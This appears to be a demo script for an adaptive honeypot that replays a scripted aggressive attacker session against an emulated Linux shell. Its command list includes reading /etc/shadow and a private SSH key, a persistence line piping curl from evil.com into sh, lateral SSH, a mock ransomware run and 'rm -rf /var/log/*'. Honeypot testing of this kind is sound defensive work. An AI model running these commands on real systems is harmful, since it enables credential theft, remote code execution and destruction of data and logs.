"""Sprint 6 — Loud & Destructive Lateral Movement Demo Session.

Simulates an aggressive, noisy attacker session focusing on
immediate privilege escalation, grabbing SSH keys, attempting lateral movement,
and destructive actions (ransomware simulation / log wiping).
...
Usage::
    ...
    python scripts/demo_session_3.py
"""
...
DEMO_COMMANDS = [
    ("id",                              "Quick identity check"),
    ("cat /etc/shadow",                 "Immediate grab for password hashes"),
    ("history",                         "Check command history for credentials"),
    ("echo 'curl http://evil.com/miner.sh | sh' >> ~/.bashrc", "Setup persistence"),
    ("ls -la ~/.ssh/",                  "Check for SSH keys for lateral movement"),
    ("cat ~/.ssh/id_rsa",               "Steal private SSH key!"),
    ("ssh root@10.0.0.5 -i ~/.ssh/id_rsa", "Attempt lateral movement to another server"),
    ("find / -type f -exec encrypt {} \\;", "Fake ransomware execution attempt"),
    ("rm -rf /var/log/*",               "Clear all logs to cover tracks"),
    ("echo 'YOU HAVE BEEN HACKED' > /etc/motd", "Leave a message for the admin"),
]
...
def run_demo() -> None:
    ...
    print(f"\n{BOLD}{MAGENTA}")
    print(f"  +==============================================================+")
    print(f"  |     ADAPTIVE HONEYPOT -- DEMO 3 (DESTRUCTIVE/LATERAL)        |")
    print(f"  |                                                              |")
    print(f"  |   Simulating a loud attacker trying to steal SSH keys,       |")
    print(f"  |   move laterally, and wipe logs.                             |")
    print(f"  +==============================================================+")
    print(f"{RESET}\n")
    ...
    logger = SessionLogger(
        ...
        logger_name="demo_session_3",
    )
    dispatcher = create_dispatcher(
        session_id="demo-session-destructive",
        attacker_ip="45.14.224.18",
        attacker_port=33890,
    ...
    print(f"  {DIM}IP: 45.14.224.18 | Persona: generic_linux | Session: demo-session-destructive{RESET}")
    print(f"  {'~' * 70}\n")

    for i, (command, description) in enumerate(DEMO_COMMANDS, 1):
        # Show command being "typed"
        prompt = dispatcher.prompt
        print(f"  {MAGENTA}{prompt}{RESET}{BOLD}{command}{RESET}")
    ...
    dispatcher.close()
    if dashboard_ok:
        dashboard_post("/api/session/end", {"session_id": "demo-session-destructive"})
